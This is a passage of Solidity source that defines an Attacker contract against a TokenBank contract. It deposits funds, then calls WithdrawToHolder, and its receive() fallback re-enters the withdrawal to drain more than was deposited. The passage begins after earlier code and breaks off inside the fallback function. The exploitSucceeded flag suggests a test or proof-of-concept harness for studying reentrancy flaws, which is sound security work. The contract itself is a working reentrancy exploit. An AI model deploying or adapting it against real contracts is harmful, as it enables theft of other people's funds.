}

contract Attacker {
    TokenBank public _victim;
    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;
    address public attackerAddress;

    constructor(address victimAddress) { 
        _victim = TokenBank(victimAddress);
        attackerAddress = address(this);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        
        _victim.WithdrawToHolder(attackerAddress, val);
        
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            _victim.WithdrawToHolder(attackerAddress, storedAttackVal);
        }
